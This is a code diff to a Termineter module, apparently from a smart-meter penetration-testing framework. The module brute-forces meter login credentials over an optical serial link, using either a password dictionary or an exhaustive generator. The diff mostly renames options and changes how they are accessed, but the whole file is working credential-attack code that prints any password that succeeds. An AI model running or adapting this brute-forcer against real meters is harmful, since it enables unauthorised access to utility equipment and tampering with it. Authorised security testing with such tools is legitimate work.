@@ -24,7 +24,7 @@ import os
 import re
 import time
 
-from termineter.templates import TermineterModuleOptical
+from termineter.module import TermineterModuleOptical
 from termineter.utilities import StringGenerator
 
 class BruteForce:
@@ -35,7 +35,7 @@ class BruteForce:
 			self.dictionary = open(dictionary_path, 'r')
 
 	def __iter__(self):
-		if self.dictionary == None:
+		if self.dictionary is None:
 			for password in StringGenerator(20):
 				yield password
 		else:
@@ -53,57 +53,54 @@ def to_hex(data):
 	return binascii.b2a_hex(data).decode('utf-8')
 
 class Module(TermineterModuleOptical):
-	require_connection = False
-	attempt_login = False
+	connection_state = TermineterModuleOptical.connection_states.none
 	def __init__(self, *args, **kwargs):
 		TermineterModuleOptical.__init__(self, *args, **kwargs)
-		self.version = 4
 		self.author = ['Spencer McIntyre']
 		self.description = 'Brute Force Credentials'
-		self.detailed_description = 'This module is used for brute forcing credentials on the smart meter.  Passwords are not limited to ASCII values and in order to test the entire character space the user will have to provide a dictionary of hex strings and set USEHEX to true.'
-		self.options.add_boolean('USEHEX', 'values in word list are in hex', default=True)
+		self.detailed_description = 'This module is used for brute forcing credentials on the smart meter.  Passwords are not limited to ASCII values and in order to test the entire character space the user will have to provide a dictionary of hex strings and set USE_HEX to true.'
+		self.options.add_boolean('USE_HEX', 'values in word list are in hex', default=True)
 		self.options.add_rfile('DICTIONARY', 'dictionary of passwords to try', required=False, default='$DATA_PATH smeter_passwords.txt')
 		self.options.add_string('USERNAME', 'user name to attempt to log in as', default='0000')
-		self.options.add_integer('USERID', 'user id to attempt to log in as', default=1)
+		self.options.add_integer('USER_ID', 'user id to attempt to log in as', default=1)
 
-		self.advanced_options.add_boolean('PUREBRUTE', 'perform a pure bruteforce', default=False)
-		self.advanced_options.add_boolean('STOPONSUCCESS', 'stop after the first successful login', default=True)
+		self.advanced_options.add_boolean('PURE_BRUTEFORCE', 'perform a pure bruteforce', default=False)
+		self.advanced_options.add_boolean('STOP_ON_SUCCESS', 'stop after the first successful login', default=True)
 		self.advanced_options.add_float('DELAY', 'time in seconds to wait between attempts', default=0.20)
 
 	def run(self):
 		conn = self.frmwk.serial_connection
 		logger = self.logger
-		usehex = self.options.get_option_value('USEHEX')
-		dictionary_path = self.options.get_option_value('DICTIONARY')
-		username = self.options.get_option_value('USERNAME')
-		userid = self.options.get_option_value('USERID')
-		pure_brute = self.advanced_options.get_option_value('PUREBRUTE')
-		time_delay = self.advanced_options.get_option_value('DELAY')
+		use_hex = self.options['USE_HEX']
+		dictionary_path = self.options['DICTIONARY']
+		username = self.options['USERNAME']
+		user_id = self.options['USER_ID']
+		time_delay = self.advanced_options['DELAY']
 
 		if len(username) > 10:
 			self.frmwk.print_error('Username cannot be longer than 10 characters')
 			return
-		if not (0 <= userid <= 0xffff):
+		if not (0 <= user_id <= 0xffff):
 			self.frmwk.print_error('User id must be between 0 and 0xffff')
 			return
 
-		if not pure_brute:
+		if self.advanced_options['PURE_BRUTEFORCE']:
+			self.frmwk.print_status('A pure brute force will take a very very long time')
+			use_hex = True  # if doing a prue brute force, it has to be True
+			pw_generator = BruteForce()
+		else:
 			if not os.path.isfile(dictionary_path):
 				self.frmwk.print_error('Can not find dictionary path')
 				return
 			pw_generator = BruteForce(dictionary_path)
-		else:
-			self.frmwk.print_status('A pure brute force will take a very very long time')
-			usehex = True # if doing a prue brute force, it has to be True
-			pw_generator = BruteForce()
 
 		hex_regex = re.compile('^([0-9a-fA-F]{2})+$')
 
 		self.frmwk.print_status('Starting brute force')
 
 		for password in pw_generator:
-			if not pure_brute:
-				if usehex:
+			if not self.advanced_options['PURE_BRUTEFORCE']:
+				if use_hex:
 					password = password.strip()
 					if hex_regex.match(password) is None:
 						logger.error('invalid characters found while searching for hex')
@@ -113,7 +110,7 @@ class Module(TermineterModuleOptical):
 				else:
 					password = password.rstrip()
 			if len(password) > 20:
-				if usehex:
+				if use_hex:
 					logger.warning('skipping password: ' + to_hex(password) + ' due to length (can not be exceed 20 bytes)')
 				else:
 					logger.warning('skipping password: ' + password + ' due to length (can not be exceed 20 bytes)')
@@ -121,19 +118,19 @@ class Module(TermineterModuleOptical):
 			while not conn.start():
 				time.sleep(time_delay)
 			time.sleep(time_delay)
-			if conn.login(username, userid, password):
-				if usehex:
-					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(userid) + ' Password: ' + to_hex(password))
+			if conn.login(username, user_id, password):
+				if use_hex:
+					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + to_hex(password))
 				else:
-					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(userid) + ' Password: ' + password)
-				if self.advanced_options.get_option_value('STOPONSUCCESS'):
+					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + password)
+				if self.advanced_options['STOP_ON_SUCCESS']:
 					conn.stop(force=True)
 					break
 			else:
-				if usehex:
-					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(userid) + ' Password: ' + to_hex(password))
+				if use_hex:
+					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + to_hex(password))
 				else:
-					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(userid) + ' Password: ' + password)
+					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + password)
 			while not conn.stop(force=True):
 				time.sleep(time_delay)
 			time.sleep(time_delay)
